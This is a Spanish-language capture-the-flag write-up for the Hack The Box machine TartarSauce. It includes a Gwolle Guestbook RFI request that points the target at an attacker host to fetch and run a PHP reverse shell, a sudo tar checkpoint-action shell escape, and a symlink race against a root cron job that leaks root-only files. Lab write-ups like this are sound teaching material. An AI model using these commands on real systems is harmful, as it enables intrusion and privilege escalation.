# TartarSauce — Write-Up

| Campo | Detalle |
|---|---|
| **Máquina** | [TartarSauce](https://app.hackthebox.com/machines/TartarSauce) |
| **Plataforma** | [Hack The Box](https://hackthebox.com/) |
| **Sistema Operativo** | Linux (Ubuntu, kernel 4.15.0) |
| **Dificultad** | Media |
| **Flags** | 2 (user + root) |

---

## Reconocimiento

### Enumeración de puertos

Se lanza un escaneo completo con Nmap para descubrir los servicios activos en la máquina:

```bash
nmap -p- -sCV -T5 10.129.1.185 -oN TartarSauce
```

![Nmap Scan](images/01.JPG)

Servicios encontrados:

| Puerto | Servicio | Versión |
|---|---|---|
| 80/tcp | HTTP | Apache httpd 2.4.18 (Ubuntu) |

El escaneo también detecta un archivo `robots.txt` con **5 entradas prohibidas**:

```
/webservices/tar/tar/source/
/webservices/monstra-3.0.4/
/webservices/easy-file-uploader/
/webservices/developmental/
/webservices/phpmyadmin/
```

El título de la página se reporta como *Landing Page*.

---

## Enumeración Web

### Página de aterrizaje

Al acceder a la raíz del servidor web se muestra una página estática con arte ASCII, sin funcionalidad aparente:

![Landing Page](images/02.JPG)

### Fuzzing de directorios

Se utiliza `ffuf` contra la raíz web con un diccionario de tamaño medio para descubrir directorios ocultos:

```bash
ffuf -u http://10.129.1.185/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 100
```

![FFUF root](images/03.JPG)

Se encuentra el directorio `webservices` (`301`). Al acceder directamente devuelve `403 Forbidden`, confirmando que el directorio existe pero el listado de su índice está bloqueado:

![Forbidden webservices](images/04.JPG)

Se repite el fuzzing dentro de `/webservices/`:

```bash
ffuf -u http://10.129.1.185/webservices/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 100
```

![FFUF webservices](images/05.JPG)

Esto revela un directorio `wp`, lo que sugiere una instalación de WordPress.

### Virtual Host / Archivo hosts

Se añade el hostname `tartarsauce.htb` al archivo `/etc/hosts` apuntando a la IP objetivo, por si la aplicación depende de virtual hosting basado en nombre o de enlaces absolutos:

![/etc/hosts](images/06.JPG)

Al navegar a `http://tartarsauce.htb/webservices/wp/` se confirma un sitio **WordPress** activo — un blog "Test blog" básico con el típico post *Hello world!* por defecto:

![WordPress test blog](images/07.JPG)

---

## Enumeración de WordPress

### WPScan

Se ejecuta `wpscan` contra la instalación de WordPress para enumerar plugins de forma agresiva:

```bash
wpscan --url http://tartarsauce.htb/webservices/wp -e ap --plugins-detection aggressive
```

![WPScan launch](images/08a.JPG)

Se identifican varios plugins:

![WPScan plugins](images/8b.JPG)

| Plugin | Versión | Estado |
|---|---|---|
| `akismet` | 4.0.3 | Desactualizado |
| `brute-force-login-protection` | 1.5.3 | Actualizado |
| `gwolle-gb` | 2.3.10 | Desactualizado (última: 5.1.0) |
| `woocommerce-gateway-placetopay` | — | Presente |

El plugin **Gwolle Guestbook** destaca como un objetivo prometedor por tratarse de una vulnerabilidad conocida y no autenticada.

---

## Explotación — Gwolle Guestbook RFI (CVE-2015-8351)

Una búsqueda en Exploit-DB confirma que **Gwolle Guestbook ≤ 1.5.3** es vulnerable a un **Remote File Inclusion (RFI)** no autenticado:

![Exploit-DB CVE-2015-8351](images/09.JPG)

El parámetro GET `abspath` en `frontend/captcha/ajaxresponse.php` no se sanitiza antes de usarse en una llamada `require()` de PHP, lo que permite a un atacante remoto hacer que apunte a un archivo alojado en un servidor bajo su control. Si se coloca allí un archivo llamado `wp-load.php`, este se incluye y ejecuta en el servidor vulnerable:

```
http://[host]/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://[atacante]/
```

### Primer intento

Se levanta un servidor HTTP local y se solicita el endpoint vulnerable con `abspath` apuntando de vuelta a él:

```bash
# Máquina atacante
python3 -m http.server 80

# Disparar el RFI
curl -s 'http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.70/'
```

El log del servidor confirma que el objetivo solicita `wp-load.php`, pero devuelve `404` porque el archivo aún no existe:

![Primer intento RFI — 404](images/10.JPG)

### Construcción del payload

Se genera una reverse shell en PHP con [revshells.com](https://www.revshells.com), configurada con la IP y el puerto `9002` del atacante, usando la plantilla PentestMonkey PHP:

![Generador de reverse shell](images/11A.JPG)

El payload generado se guarda localmente como `wp-load.php`, con la IP/puerto de callback configurados en consecuencia:

![wp-load.php reverse shell](images/11B.JPG)

### Disparando la shell

Con `wp-load.php` ya presente en el directorio servido y un listener activo, se repite la petición del RFI:

```bash
# Máquina atacante
python3 -m http.server 80
nc -lvnp 9002

# Disparar el RFI de nuevo
curl -s 'http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.70/'
```

Ahora el servidor HTTP devuelve `200` para `wp-load.php`, y se recibe una reverse shell en el listener como `www-data`:

![Shell obtenida como www-data](images/12.JPG)

```
Linux TartarSauce 4.15.0-041500-generic ... i686 athlon i686 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Escalada de Privilegios — www-data → onuma

Se realiza una enumeración básica desde la shell de bajo privilegio:

```bash
id
sudo -l
ls /home
```

![Resultado de sudo -l](images/13.JPG)

La salida de `sudo -l` revela que `www-data` puede ejecutar `/bin/tar` **como el usuario `onuma`**, sin necesidad de contraseña:

```
User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```

Este es un vector de escalada de privilegios muy conocido en **GTFOBins**: el `tar` de GNU admite la opción `--checkpoint-action`, que puede abusarse para ejecutar comandos arbitrarios durante operaciones de archivado. Ejecutando `tar` bajo `sudo -u onuma` con esta opción se obtiene una shell corriendo como `onuma`:

```bash
sudo -u onuma /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

Esto proporciona una shell como el usuario `onuma`:

![Shell como onuma](images/14.JPG)

```
onuma@TartarSauce:~$ ls
shadow_bkp
user.txt
```

Se lee la flag `user.txt` desde el directorio home de `onuma`. También llama la atención un archivo `shadow_bkp` presente en la carpeta home — un backup olvidado que anticipa lo descuidadas que son las rutinas de backup en esta máquina, lo cual será relevante en la siguiente fase.

---

## Escalada de Privilegios — onuma → root

### Descubriendo el cron de backup con pspy

Al no disponer de un listado interactivo de procesos, se utiliza **pspy** para monitorizar procesos sin necesidad de privilegios elevados, buscando tareas programadas que se ejecuten como `root`:

![Salida de pspy](images/16pspy_launch.JPG)

Se observa un proceso recurrente, ejecutado por `UID=0` a intervalos regulares:

```
/bin/bash /usr/sbin/backuperer
```

### Analizando `backuperer`

El script es legible por `onuma` y se procede a inspeccionarlo:

![Script backuperer](images/17.JPG)

Comportamiento clave del script:

- Realiza un backup de `/var/www/html` (`$basedir`) en un archivo temporal dentro de `/var/tmp` (`$tmpdir`), usando un **nombre de archivo predecible** derivado de un hash aleatorio: `/var/tmp/.$(head -c100 /dev/urandom | sha1sum | cut -d' ' -f1)`.
- El propio backup se crea con `sudo -u onuma /bin/tar -zcvf $tmpfile $basedir`, es decir, el archivo se genera **como `onuma`**, un usuario ya bajo control del atacante.
- Tras un `sleep 30`, el script (que se ejecuta como **root** vía cron) extrae ese mismo archivo en un directorio `$check` y ejecuta `diff -r $basedir $check$basedir` para verificar su integridad.
- Cualquier diferencia detectada por `diff` se añade, **como root**, al archivo `/var/backups/onuma_backup_error.txt`, el cual es legible por `onuma`.

Como `/var/tmp` tiene permisos de escritura para todos y el ciclo de backup/verificación es predecible y tiene una ventana de carrera de 30 segundos, un atacante que controla la cuenta `onuma` (que crea el archivo original) puede **sustituir el archivo** antes de que root lo extraiga y compare. Si el archivo sustituido contiene un **enlace simbólico** en lugar de un archivo real, el `diff` de root lo seguirá sin problema y filtrará su contenido al log de errores (legible por `onuma`) — incluyendo archivos que `onuma` no tiene permiso directo para leer, como `/root/root.txt`.

### Construcción del exploit de condición de carrera

Se escribe un script para automatizar la carrera:

![Script malicioso de carrera](images/18.JPG)

Lógica de `scriptMalicious.sh`:

1. Vigilar `/var/tmp` a la espera de un nuevo archivo creado por el cron de `backuperer` (el `tar` ejecutado como `onuma`).
2. En cuanto aparece, copiarlo localmente y extraerlo.
3. Borrar `robots.txt` dentro de la raíz web extraída y sustituirlo por un **enlace simbólico**: `ln -s /root/root.txt var/www/html/robots.txt`.
4. Reempaquetar el archivo con el `robots.txt` manipulado y sustituirlo de vuelta en `/var/tmp`, sobrescribiendo el archivo legítimo antes de que root ejecute la extracción/diff.
5. Hacer `tail` sobre `/var/backups/onuma_backup_error.txt` y esperar a que el siguiente ciclo de backup dispare la verificación de integridad.

### Ejecución del exploit

El script se ejecuta y se deja corriendo mientras el cron vuelve a dispararse:

![Ejecución del exploit y filtración de root.txt](images/19.JPG)

Cuando `backuperer` se ejecuta como root, extrae el archivo manipulado y lo compara con la raíz web real. Como `robots.txt` es ahora un enlace simbólico a `/root/root.txt`, el `diff` de root lee y reporta el **contenido de `root.txt`** directamente en el log de errores que `onuma` está siguiendo con `tail`, evitando por completo la necesidad de una shell interactiva como root:

```
diff -r /var/www/html/robots.txt /var/tmp/check/var/www/html/robots.txt
1,7c1
< User-agent: *
< Disallow: /webservices/tar/tar/source/
< Disallow: /webservices/monstra-3.0.4/
< Disallow: /webservices/easy-file-uploader/
< Disallow: /webservices/developmental/
< Disallow: /webservices/phpmyadmin/
<
---
> <contenido de root.txt>
```

La flag de root se exfiltra con éxito a través de la salida del `diff`, sin llegar a necesitar en ningún momento una shell de root en la máquina.

---

## Resumen

| Fase | Técnica | Herramienta |
|---|---|---|
| Enumeración | Port scan | `nmap` |
| Enumeración web | Fuzzing de directorios + exposición de `robots.txt` | `ffuf` |
| Enumeración web | Fingerprinting de plugins de WordPress | `wpscan` |
| Explotación | Remote File Inclusion — Gwolle Guestbook (CVE-2015-8351) | `curl`, reverse shell PHP |
| Acceso inicial | Reverse shell como `www-data` | `nc` |
| Escalada de privilegios #1 | Mala configuración de `sudo` — GTFOBins `tar` checkpoint-action | `sudo`, `tar` |
| Enumeración interna | Monitorización de procesos sin root | `pspy` |
| Escalada de privilegios #2 | Condición de carrera / symlink attack sobre el cron `backuperer` | Script bash personalizado |
